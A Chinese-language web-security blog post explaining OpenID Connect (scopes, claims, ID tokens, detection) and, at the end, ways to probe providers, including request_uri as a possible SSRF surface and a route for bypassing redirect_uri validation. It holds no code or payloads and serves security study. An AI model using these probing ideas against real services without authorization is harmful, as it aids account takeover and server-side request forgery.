OpenID connect组件介绍

yu1e
2023-10-04
WebSecurity

什么是OpenID Connect？

OpenID Connect是一种OAuth协议的扩展，以提供位于基本OAuth实现之上的身份验证。它添加了一些简单的功能，可以更好地支持OAuth的身份验证。

OAuth最初设计的时候是没有哦考虑身份验证的，而是作为在不同应用程序之间的资源授权的一种方法。然而随着许多网站开始定制OAuth作为一种认证机制，出于这个目的，网站会请求对一些基本的用户数据进行访问，如果这个请求被授权，网站就会假设用户已经在OAuth provider端进行了身份验证。

客户端应用程序本身是不知道什么时候用什么方法对用户进行身份验证的，必须为不同的OAuth provider设置单独的OAuth机制，这就很麻烦，OpenID Connect通过添加更加标准化的身份验证特性来进行身份验证，解决了这个问题。

OpenID Connect的运行方式？

OpenID Connect可以直接作用于OAuth flow中，从应用程序的角度看，关键的不同在于有一组额外的标准化作用域，这个作用域对所有的provider都是相同的，此外还有一个额外的响应类型：id_token

OpenID Connect 中的角色

基本上和OAuth中差不多

  • Relying party - 请求用户身份验证的应用程序，也就是客户端应用程序
  • End user - 用户
  • OpenID provider - 支持OpenID Connect的OAuth service
OpenID Connect 中的claims和scope

claims指的是资源服务器上用户信息的键值对，比如，“family_name”：“Montoya”。

基本的OAuth中的scope对于每一个provider都是唯一的，与这个不同，所有的OpenID Connect service使用的是一组相同的scope。为了能够使用OpenID Connect，应用程序必须在认证请求中明确范围（openid），这些范围可以包括一个或多个标准的范围：

  • profile
  • email
  • address
  • phone

每一个上面的scope都对应了用户信息子集的访问，比如open id profile就会授予应用程序读取用户身份相关的信息，如family_name, given_name, birth_date等。

ID token

OpenID Connect提供的另一个主要功能是 id_token 响应类型，这会返回一个使用JSON web签名（JSON web signature，JWS）的JSON web token（JWT），JWT中包含最初授权请求的一系列用户信息，同时也包含用户上一次被OAuth service验证的时间和方式，客户端应用程序可以使用这一点来决定用户是否已被充分验证。

使用id_token的主要好处是减少了应用程序和OAuth service之间互相发送请求的次数，提供了更好的性能。和先请求access token再去请求用户数据不同，ID token 会在用户通过身份验证之后直接在响应中包含用户数据并发送至应用程序。

ID token 中数据传输的完整性是基于JWT加密签名的。

注意，由于OAuth支持多种响应类型，因此客户端应用程序完全可以使用基本OAuth响应类型和OpenID Connect的id_token响应类型发送授权请求：

这种情况下，ID token和access token（access code）都会被发送到应用程序。

识别OpenID Connect

如果客户端应用程序正在使用OpenID connect，那么从授权请求中可以明显看出这一点。最简单的检查方法是查找openid范围。

即使登录过程最初看起来没有使用OpenID Connect，最好还是检查一下OAuth service是否支持OpenID Connect。可以尝试添加openid scope或将响应类型更改为id_token，然后看是否报错。

OpenID Connect中的漏洞

OpenID Connect的规范比基本OAuth的规范严格得多，这意味着通常不太可能出现明显漏洞。但是，由于它只是位于OAuth之上的一个层，所以客户端应用程序或OAuth service可能仍然容易受到一些基于basic OAuth的攻击。

下面将讨论OpenID Connect的一些额外功能可能会引入的一些漏洞。

Allowing authorization requests by reference

一些OpenID provider提供了将授权参数作为JSON web token（JWT）传递的选项。如果支持此功能，则可以发送一个指向JSON web token的request_uri参数，该token包含其他OAuth参数及其值。根据OAuth service的配置，这个request_uri参数是SSRF的另一个潜在攻击面。

攻击者可能利用此特性来绕过一些参数值的验证，一些服务器可能会验证授权请求中的键值对，但是可能无法用同样的方法验证JWT中的参数，包括redirect_uri。

要检查OpenID provider是否支持此特性，应在配置文件中查找request_uri_parameter_supported选项。或者，可以尝试添加request_uri参数，看看是否有效。
